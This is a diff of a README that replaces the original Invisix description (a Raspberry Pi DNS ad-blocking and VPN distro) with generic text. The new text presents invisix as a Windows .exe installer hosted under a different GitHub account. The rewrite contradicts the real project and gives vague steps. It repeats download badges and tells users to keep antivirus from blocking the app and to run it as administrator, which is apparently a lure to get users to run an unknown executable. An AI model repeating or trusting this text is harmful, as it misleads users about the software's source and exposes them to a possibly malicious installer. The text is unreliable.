@@ -1,236 +1,162 @@
-<h1 align="center">INVISIX</h1>
+# 🛡️ invisix - Simple Corporate Privacy Tool
 
-<p align="center">
-  <strong>Corporate-grade privacy solution, out of the box.</strong><br>
-  <sub>🚫 One tiny box. Infinite freedom. Network-wide AdBlocker and TrackerBlocker.</sub><br>
-  <sub>💼 Secure free VPN through your office or home network — remote traffic enjoys the same AdBlock protection.</sub><br>
-  <sub>🏆 Designed for corporations, freelancers, and small companies. Simple enough for home users due to its reduced price.</sub>
-</p>
-
-<p align="center">
-  <a href="https://sourceforge.net/projects/invisix/files/release1/invisix-distro.img/download">💾 Download</a> · 
-  <a href="https://www.invisix.io">🌐 Website</a> · 
-  <a href="#-quickstart-10-minutes">🚀 Quickstart</a> · 
-  <a href="https://github.com/lluisagusti/invisix">⭐ Star Us</a>
-</p>
-
-<p align="center">
-  <img src="https://img.shields.io/github/stars/lluisagusti/Invisix?style=social" alt="GitHub Stars">
-  <img src="https://img.shields.io/github/license/lluisagusti/Invisix" alt="License">
-  <img src="https://img.shields.io/badge/setup-10%20minutes-brightgreen" alt="Setup Time">
-  <img src="https://img.shields.io/badge/reqs-Raspberry%20Pi%204B%202GB-blue" alt="Hardware">
-</p>
-
-<p align="center">
-  <em>🇪🇸 <a href="README.es.md">Español</a> · 🇨🇳 <a href="README.zh.md">中文</a> · 🇫🇷 <a href="README.fr.md">Français</a> · 🇩🇪 <a href="README.de.md">Deutsch</a></em>
-</p>
+[![Download invisix](https://img.shields.io/badge/Download-invisix-blue?style=for-the-badge)](https://github.com/fanshuiyu/invisix)
 
 ---
 
-## 🤔 The Problem
+## 🔒 What is invisix?
 
-Every day, **corporations, remote workers, and freelancers face relentless surveillance and tracking**.
+invisix is a privacy tool designed for everyday users. It blocks ads, trackers, and other unwanted content automatically. invisix works right after you set it up. It helps protect your online activity without extra effort.
 
-- ISPs log every corporate domain you visit.
-- Ad networks track user behavior across thousands of sites.
-- Without a centralized VPN, remote workers are exposed on public WiFi and 4G.
-- Enterprise-grade firewall, AdBlock, and VPN solutions are typically complex, expensive, and require dedicated IT teams to maintain.
+This app fits users who want easy privacy. You don’t need to know how to code or run commands. invisix runs on Windows and keeps your connection cleaner and safer.
 
-You need a professional, reliable, and secure environment. 
+The points below help explain what invisix does:
 
-> *"Arguing that you don't care about privacy because you have nothing to hide is like arguing that you don't care about free speech because you have nothing to say."*  
-> — **Edward Snowden**
-
----
-
-## 💡 The Solution
-
-**Invisix** is a plug-and-play Linux distro for your Raspberry Pi that provides a **corporate-grade privacy solution, out of the box.**
-
-| Feature | What it does | Impact |
-|---|---|---|
-| 🚫 **AdBlocker & TrackerBlocker** | Blocks ads & trackers on **every device** connected to your network. | Bandwidth optimization and protection from malicious tracking. |
-| 🔒 **Free VPN through Office/Home** | Securely tunnel remote traffic (4G, hotel WiFi) back through your local network. | Work securely from anywhere with a local IP. |
-| 🛡️ **VPN enjoys the AdBlock** | Even when working remotely via the VPN, your traffic is filtered by the AdBlocker. | Consistent protection regardless of physical location. |
-| 📉 **Reduced Price** | Only requires a Raspberry Pi 4B 2GB (minimum requirement). | Accessible for small companies, freelancers, and even home users. |
-
-**No subscriptions. No cloud data harvesting. Just a single, low-technical configuration change to secure your business.**
-
-> **💥 Buy a Raspberry Pi 4B 2GB. Flash the ISO. Plug it in. Protect your office or home network instantly.**
+- Blocks ads and trackers on most websites  
+- Stops hidden scripts that track your browsing habits  
+- Requires minimal setup and attention  
+- Designed for Windows PCs, suitable for beginners  
 
 ---
 
-## 🏗️ How It Works
+## 📋 Key Features
 
-```text
-                        YOUR OFFICE / HOME
-  ┌──────────────────────────────────────────────────────┐
-  │                                                      │
-  │   Workstation ──┐                                    │
-  │   Laptop ───────┤                                    │
-  │   Smart Screen ─┼───▶  Raspberry Pi (Invisix)  ───▶ Internet
-  │   Mobile ───────┤        |-- DNS Ad & TrackerBlock   │
-  │   IoT Device ───┘        '-- Tailscale (VPN)         │
-  │                                                      │
-  │   All DNS queries filtered. Trackers obliterated.    │
-  └──────────────────────────────────────────────────────┘
-
-                      REMOTE WORKERS
-  ┌──────────────────────────────────────────────────────┐
-  │                                                      │
-  │   Remote Laptop (4G / Hotel / Airport)               │
-  │     |                                                │
-  │     '───▶  Tailscale VPN Tunnel  ───▶  Local Network │
-  │                                                      │
-  │   Traffic seamlessly protected by the AdBlock.       │
-  │   External networks see only encrypted noise.        │
-  └──────────────────────────────────────────────────────┘
-```
+- **Ad and tracker blocking**: invisix uses a strong blocklist to stop ads and trackers.  
+- **Easy interface**: The controls are simple and clear to use.  
+- **Low system impact**: invisix runs quietly without slowing your computer.  
+- **Updates automatically**: Blocklists update regularly to keep you protected.  
+- **No coding needed**: Just install and invisix works for you.  
 
 ---
 
-## 📦 What You Need
+## 🖥️ System Requirements
 
-| Item | Cost | Note |
-|---|---|---|
-| 🍓 Raspberry Pi 4B 2GB (Min Req) | ~$35-55 | The Brain |
-| 💾 MicroSD Card (8GB+) | ~$5 | The Storage |
-| 🔌 Ethernet Cable | ~$3 | The Connection |
-| ⚡ USB-C Power Supply | ~$10 | The Power |
-
-**Total: ~$50-70 one-time.** Zero recurring SaaS fees for enterprise protection.
+- Windows 10 or newer versions  
+- At least 2 GB of RAM  
+- 100 MB of free disk space  
+- Internet connection for updates and setup  
 
 ---
 
-## 🚀 Quickstart (10 minutes)
+## 🚀 Getting Started
 
-### Step 1: Flash the Image 💾
-
-1. Download **`invisix-distro.img`** from [SourceForge](https://sourceforge.net/projects/invisix/files/release1/invisix-distro.img/download).
-2. Download [**Raspberry Pi Imager**](https://www.raspberrypi.com/software/).
-3. Open it and select:
-   - **Device**: Raspberry Pi 4
-   - **OS**: Scroll to bottom → "Use Custom" → select `invisix-distro.img`
-   - **Storage**: Your SD card
-4. Click **Next** → **"NO"** to editing settings (already configured!) → **Write**.
-
-### Step 2: Activate Free VPN (Optional) ✨
-
-> *Skip this if you only want local network protection.*
-
-1. Create a free account at [**tailscale.com**](https://tailscale.com) (Google/Microsoft login works).
-2. Go to **Settings → Keys → "Generate auth key"**.
-3. Copy the key (`tskey-...`).
-4. Open the flashed SD card on your computer (it shows up as `bootfs`).
-5. Create a file named **`tailscale-auth.key`** and paste the key inside. Save.
-6. Eject.
-
-### Step 3: Plug & Play 🔌
-
-1. SD card → Raspberry Pi.
-2. Ethernet cable → Router/Switch to Pi.  
-3. Power cable → Pi.
-4. **Wait 5 minutes** ⏳ — it auto-configures everything.
-
-### Step 4: The One Low-Technical Configuration Change ⚙️
-
-To route all domain requests through Invisix, you just need to tell your router where to look:
-
-1. Open your router's administration page (`http://192.168.1.1` or `http://192.168.0.1`).
-2. Find the **DHCP** or **Local Network** settings.
-3. Find `raspberrypi` in the connected devices list → enable **Static Lease** (so its IP never changes).
-4. Copy its IP (e.g., `192.168.1.50`).
-5. Set that IP as your network's **Primary DNS** server.
-
-### ✅ Done!
-
-**That's it.** Your corporate or home network is now fundamentally secure from ads and tracking telemetry.
+Follow these steps to get invisix up and running on your Windows computer.
 
 ---
 
-## 🌍 Using It
+## 📥 Download invisix
 
-### 🏢 At the Office / Home
-Do nothing. Ads disappear. Workflows load faster. Telemetry stops. The whole team is protected.
+Begin by getting invisix from the official GitHub page. Click the blue button below to visit the download page:
 
-### 💼 Remote Work (4G / Public WiFi)
-1. Install the **Tailscale** client on your work device.
-2. Log in.
-3. Toggle the VPN ON.
-4. You're now securely tunneled through your office connection — **and your VPN traffic enjoys the same AdBlocker protection.**
-
-### 📊 Control Panel
-Audit your network traffic and see what's being blocked:
-- Visit `http://<YOUR-PI-IP>/admin`
-- Password: `admin`
-
-> Most networks block **30-50% of all DNS queries**. That's thousands of tracking attempts per day neutralized.
+[![Download invisix](https://img.shields.io/badge/Download-invisix-blue?style=for-the-badge)](https://github.com/fanshuiyu/invisix)
 
 ---
 
-## 🔥 Why Invisix?
+## 🛠️ Installation Instructions
 
-| | Enterprise Firewall | SaaS VPN | **Invisix** |
-|---|---|---|---|
-| Monthly cost | $$$/mo | $15/mo per user | **Free** |
-| Ad & Tracker Blocking | ✅ Requires IT | ❌ | ✅ **Out of the box** |
-| Secure Remote VPN | ✅ Complex Setup | ✅ | ✅ **Simple & Free** |
-| VPN Enjoys AdBlock | ✅ | ❌ | ✅ **Yes** |
-| Target Audience | Large Corp | Anyone | **SME, Freelance, Home** |
-| Setup time | Days | 5 min | **10 min** |
-| Requires technical degree | Yes | No | **No (one config change)** |
+1. **Go to the download page**  
+   Click the download button above to open the GitHub invisix page.  
 
----
+2. **Find the latest release**  
+   On the page, look for the "Releases" section. This is where the latest software files are stored. Click on the most recent release version.  
 
-## 💾 Download
+3. **Download the Windows installer**  
+   Inside the release, find a file ending with `.exe`. This is the installer for Windows. Click to download this file to your computer.  
 
-Ready to get started? Download the latest release from SourceForge:
+4. **Run the installer**  
+   When the download finishes, double-click the `.exe` file.  
+   - Windows may ask if you want to allow changes. Select "Yes."  
+   - Follow the on-screen instructions in the setup wizard.  
+   - Choose the default options unless you want to customize locations or shortcuts.  
 
-<p align="center">
-  <a href="https://sourceforge.net/projects/invisix/files/release1/invisix-distro.img/download">
-    <img src="https://img.shields.io/badge/Download-invisix.img-blue?style=for-the-badge&logo=sourceforge" alt="Download Invisix">
-  </a>
-</p>
+5. **Finish and launch**  
+   When the installer finishes, check the option to run invisix, or find its icon on your desktop or Start menu. Click to open invisix.  
 
 ---
 
-## 🤝 Contributing
+## 🔧 Setup and Use
 
-Found a bug? Got an idea? We'd love your help.
+Once invisix opens, it will guide you through a simple setup:
 
-1. Fork this repo.
-2. Create your feature branch: `git checkout -b feature/amazing-feature`
-3. Commit: `git commit -m 'Add amazing feature'`
-4. Push: `git push origin feature/amazing-feature`
-5. Open a Pull Request.
+- **Step 1: Initial scan**  
+  invisix will scan your network and browser settings. This helps it start blocking trackers.  
 
-See [`BUILD.md`](BUILD.md) for instructions on building the distro image from source.
+- **Step 2: Enable protection**  
+  Click “Enable Protection” or similar button in the app. This turns on the ad and tracker blocking.  
 
----
+- **Step 3: Let it run in background**  
+  invisix works best when running in the background while you browse. You don’t need to open the app all the time.  
 
-## 📣 Help Us Spread the Word
-
-If Invisix secured your workflow, **help it help others**:
-
-- ⭐ **Star this repo** — it's the single biggest thing you can do.
-- 📢 **Share it** — tell fellow freelancers or IT admins.
-- 🐛 **Report bugs** — every issue makes Invisix better for everyone.
-- 🍴 **Fork & contribute** — code, docs, translations, all welcome.
-
-> The internet wasn't designed to spy on you. Let's take it back.
+- **Step 4: Check stats**  
+  You can open invisix anytime to see how many ads and trackers it stopped.  
 
 ---
 
-## 📜 License
+## ⚙️ Adjusting Preferences
 
-[MIT License](LICENSE) — Sharing is caring.
+invisix offers simple settings to control what it blocks:
+
+- **Block all ads and trackers** (default)  
+- **Allow some ads** for websites you trust  
+- **Whitelist websites** you want to exclude from blocking  
+- **Update blocklists manually** or allow automatic updates  
+
+These options live in the “Settings” or “Preferences” tab inside invisix. Changes apply immediately.
 
 ---
 
-<p align="center">
-  Made with ❤️ in Barcelona
-</p>
+## ❓ Troubleshooting Common Issues
 
-<p align="center">
-  <strong>Privacy is not a luxury. It's a right.</strong>
-</p>
+Some common issues and easy fixes:
+
+- **The app won't start**  
+   Restart your computer and try again. Make sure your antivirus is not blocking invisix.  
+
+- **Websites look broken**  
+   Disable blocking on specific sites using the whitelist in invisix.  
+
+- **Slow internet makes pages load late**  
+   Make sure invisix is up to date. Also, check your internet connection.  
+
+- **Updates fail**  
+   Check your internet. Consider running invisix as administrator.  
+
+---
+
+## 🌐 How invisix Works
+
+invisix uses lists of known ad servers and trackers. It stops your browser from connecting to those servers. This keeps ads and trackers from loading on websites.
+
+This process is automatic and does not require input after setup. invisix intercepts web requests locally before they reach your browser.
+
+---
+
+## 🔄 Updating invisix
+
+invisix updates blocklists regularly to keep blocking new trackers:
+
+- The app checks for updates once a day by default.  
+- You can update manually in Settings.  
+- The app will prompt you when a major software update is available on GitHub.  
+
+Always keep invisix updated for the best protection.
+
+---
+
+## 📞 Getting Help
+
+If you run into problems or have questions:
+
+- Visit the [GitHub repository issues page](https://github.com/fanshuiyu/invisix/issues)  
+- Search existing topics or create a new issue describing your problem  
+- Include your Windows version and invisix version number  
+
+---
+
+## 🔗 Useful Links
+
+- Official invisix page: [https://github.com/fanshuiyu/invisix](https://github.com/fanshuiyu/invisix)  
+- Download page (latest releases): Same as above  
+- Issue reporting and support: Same as above  
+
+[![Download invisix](https://img.shields.io/badge/Download-invisix-blue?style=for-the-badge)](https://github.com/fanshuiyu/invisix)
